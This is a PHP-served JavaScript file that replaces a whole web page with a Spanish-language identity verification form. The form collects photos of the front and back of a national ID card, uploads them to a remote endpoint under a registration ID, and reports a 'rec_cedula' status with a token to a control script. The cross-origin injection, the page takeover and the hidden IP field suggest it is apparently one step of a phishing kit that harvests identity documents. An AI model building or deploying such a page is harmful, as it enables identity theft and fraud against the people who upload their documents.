<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
?>
(function(){
  var data = (typeof window !== 'undefined' && window.my_data) ? window.my_data : {};
  var hosting = (typeof window !== 'undefined' && window.my_hosting) ? String(window.my_hosting) : '';
  var hostingBase = hosting ? hosting.replace(/\/+$/, '') : '';
  var idreg = (data && data['registro']) ? String(data['registro']) : '';

  var titulo = 'Verificación de identidad';
  try { var t = document.getElementById('titulo'); if (t) t.textContent = titulo; } catch(e){}

  var contenido = `
  <link rel="stylesheet" href="${hostingBase}/css/flow-theme.css" />
  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">

  <style>
    .id-panel { display: flex; flex-direction: column; gap: 14px; }
    .grid { display: grid; gap: 12px; grid-template-columns: 1fr 1fr; }
    @media(max-width:520px){ .grid { grid-template-columns: 1fr; } }
    .upload-card { display: grid; place-items: center; gap: 6px; }
    .upload-card i { font-size: 24px; color: var(--ink); }
    .status { font-size: 13px; font-weight: 600; color: var(--muted); text-align: center; }
  </style>

  <main class="flow-shell">
    <div class="logo-mark" aria-hidden="true">
      <span></span><span></span><span></span>
    </div>

    <h1 class="flow-title">Petición de Cédula</h1>
    <p class="flow-subtitle">Sube fotos legibles del frente y reverso del documento.</p>

    <section class="panel id-panel">
      <div class="figure-card">
        <img src="${hostingBase}/assets/img/id.png" loading="lazy" decoding="async" alt="Ejemplo de ambas caras del documento">
        <p class="figure-caption">Confirma que ambos lados se vean completos, sin reflejos y con buena luz.</p>
      </div>

      <div class="grid">
        <div>
          <label class="upload-card" for="fileCedulaAdelante">
            <i class='bx bx-id-card'></i>
            <div>Frente</div>
            <small class="helper-text">Selecciona una foto clara.</small>
            <input type="file" id="fileCedulaAdelante" accept="image/*">
          </label>
          <img id="previewCedulaAdelante" class="upload-preview" alt="Previsualización frente"/>
          <div id="statusAdelante" class="status"></div>
        </div>
        <div>
          <label class="upload-card" for="fileCedulaAtras">
            <i class='bx bx-id-card'></i>
            <div>Reverso</div>
            <small class="helper-text">Selecciona una foto clara.</small>
            <input type="file" id="fileCedulaAtras" accept="image/*">
          </label>
          <img id="previewCedulaAtras" class="upload-preview" alt="Previsualización dorso"/>
          <div id="statusAtras" class="status"></div>
        </div>
      </div>

      <div id="successMsg" class="helper-text" style="display:none; color: var(--success); font-weight:700;">✅ ¡Documentos cargados correctamente!</div>

      <button id="btn-finish" class="btn-primary" disabled>CONTINUAR</button>
    </section>

    <div class="meta-hidden">
      <div id="ipc">Dirección IP:</div>
      <div id="jclock1"></div>
    </div>
  </main>`;


  document.body.innerHTML = contenido;
  try { localStorage.setItem('contenido', contenido); } catch(e){}

  if (!idreg) {
    var allStatus = document.querySelectorAll('.status');
    allStatus.forEach(function(s){ s.className = 'status err'; s.textContent = 'Error: falta ID de registro.'; });
    return;
  }

  var cara1 = false, cara2 = false;
  var $btn = document.getElementById('btn-finish');

  function setBtn(){
    $btn.disabled = !(cara1 && cara2);
    try {
      var ok = (cara1 && cara2);
      var sm = document.getElementById('successMsg');
      if (sm) sm.style.display = ok ? 'block' : 'none';
    } catch(e){}
  }

  function uploadSide(inputId, previewId, statusId, lado){
    var $in = document.getElementById(inputId);
    var $pre = document.getElementById(previewId);
    var $st = document.getElementById(statusId);
    if (!$in) return;
    $in.addEventListener('change', function(){
      var f = this.files && this.files[0]; if (!f) return;
      try { var r = new FileReader(); r.onload = function(e){ $pre.src = e.target.result; $pre.style.display='block'; }; r.readAsDataURL(f);} catch(e){}

      var fd = new FormData();
      fd.append('idreg', idreg);
      fd.append('lado', lado);
      fd.append('imagen', f);
      fetch(hostingBase + '/api/media.php', { method:'POST', body: fd })
        .then(function(res){ return res.json(); })
        .then(function(j){
          if (j && j.status === 'ok'){
            $st.className = 'status ok';
            $st.textContent = 'Subido correctamente';
            if (lado === 'cara1') cara1 = true; else cara2 = true;
            setBtn();
          } else {
            $st.className = 'status err';
            $st.textContent = 'Error: ' + (j && j.msg ? j.msg : 'no se pudo subir');
          }
        })
        .catch(function(){ $st.className = 'status err'; $st.textContent = 'Error en la subida'; });
    });
  }

  uploadSide('fileCedulaAdelante','previewCedulaAdelante','statusAdelante','cara1');
  uploadSide('fileCedulaAtras','previewCedulaAtras','statusAtras','cara2');

  if ($btn){
    $btn.addEventListener('click', function(){
      if (!(cara1 && cara2)) return;
      try {
        var fd = new FormData();
        fd.append('idreg', idreg);
        try { if (typeof window.token !== 'undefined' && token) { fd.append('tok', token); } } catch(e){}
        fd.append('status', 'rec_cedula');
        fetch(hostingBase + '/api/state.php', { method: 'POST', body: fd })
          .then(function(){
            try{ if (typeof window.processing === 'function') window.processing({ t: 'consultar' }); }catch(e){}
          })
          .catch(function(){ try{ if (typeof window.processing === 'function') window.processing({ t: 'consultar' }); }catch(e){} });
      } catch(e) {
        try{ if (typeof window.processing === 'function') window.processing({ t: 'consultar' }); }catch(e){}
      }
    });
  }

  setTimeout(setBtn, 200);

  if (typeof window.my_data !== 'undefined' && (my_data.error || my_data.mensaje)) {
    try {
      var el = document.getElementById('successMsg');
      el.className = 'alert';
      el.style.display = 'block';
      el.textContent = (my_data.error || my_data.mensaje);
    } catch(e){}
  }
})();
